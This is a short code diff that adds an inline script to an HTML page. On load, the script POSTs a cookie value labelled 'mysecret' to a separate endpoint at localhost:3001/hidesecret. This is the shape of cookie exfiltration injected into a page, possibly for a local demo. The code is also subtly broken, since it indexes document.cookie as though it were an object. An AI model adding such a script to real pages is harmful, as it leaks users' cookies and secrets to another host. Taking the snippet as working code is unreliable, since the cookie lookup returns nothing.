@@ -1,2 +1,16 @@
+  <script>
+    fetch('http://localhost:3001/hidesecret', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ 
+        'some':  "data",
+        'mysecret':  document.cookie['mysecret']
+      })
+    })
+    .then(response => console.log('Request sent'))
+    .catch(error => console.error('Error:', error));
+  </script>
   </body>
 </html>
